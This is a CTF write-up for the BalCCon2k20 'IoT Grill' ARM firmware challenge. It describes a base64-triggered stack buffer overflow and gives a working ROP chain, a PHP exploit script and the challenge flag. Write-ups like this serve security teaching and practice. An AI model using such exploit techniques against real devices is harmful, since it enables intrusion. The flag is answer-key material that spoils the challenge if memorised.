# IoT Grill - BalCCon2k20 CTF (pwn, 497p, 1 solved)
## Introduction

IoT Grill is a pwn task.

An archive containing an ARM firmware and a qemu script to run it is provided.

The fimrware simulates a connected grill. It is possible to change the
temperature settings, start the grill and update the device key.

## Reverse engineering

Reversing an ARM firmware can be time consuming.

Fortunately, looking at cross references to strings such as `Device key` helps
find the menu function. It also helps identify the `printk` function.

By looking at the cross references it is possible to identify the main function.

The `Poweroff` menu option leaves the function.

The `Grill Cevape` menu option prints a string.

The `Change temperature setting` changes the temperature between 50 and 500
degrees.

The `Update device key` updates the device key. There is special case if the key
starts with `B64:` : it will decode the input as base64.

```c
char  *string;
size_t size;
size_t clearSize;
char   buffer[0x24];

printk("Enter a new device key> ");
string = readString();
size   = strlen(string);

if(0 == strncmp(string, "B64:", 4)) {
	/* Don't write, but calculate the size and write in in clearSize */
	b64_decode(NULL, 0, &clearSize, string + 4, size - 4);

	/* Decode into buffer */
	b64_decode(buffer, clearSize, &clearSize, string + 4, size - 4);
} else {
	/* ... */
}
```

This function is vulnerable to a classic stack-based buffer overflow.

## Exploitation

This challenge was solved by using a simple ROP chain that calls `printk(flag)`.

The ROP chain is the following :
```
0x00001458: pop {r0, pc}
0x00004043: "BCTF{flag}"

0x00002CB0: printk
```

The only particularity of the ARM architecture is that instructions in THUMBS
mode must have their least significant bit set.

The `changeKey` function returns using `pop {r4, r5, r6, r7, pc}`. This has to
be taken into account when padding the stack.


**Flag**: `BCTF{c0ngr4ts_y0u_put_a_gr1ll_on_th3_n3t_and_n0w_cevap3_ar3_burn3d}`

## Appendices
### pwn.php

```php
<?php
const POPR0   = 0x00001458 | 1;
const FLAG    = 0x00004043;
const PRINTK  = 0x00002CB0 | 1;

$payload  = str_repeat("A", 0x24);
$payload .= pack("V*",
	0x44444444, 0x55555555, 0x66666666, 0x77777777,
	POPR0, FLAG,
	PRINTK,
);

printf("B64:%s\n", base64_encode($payload));
```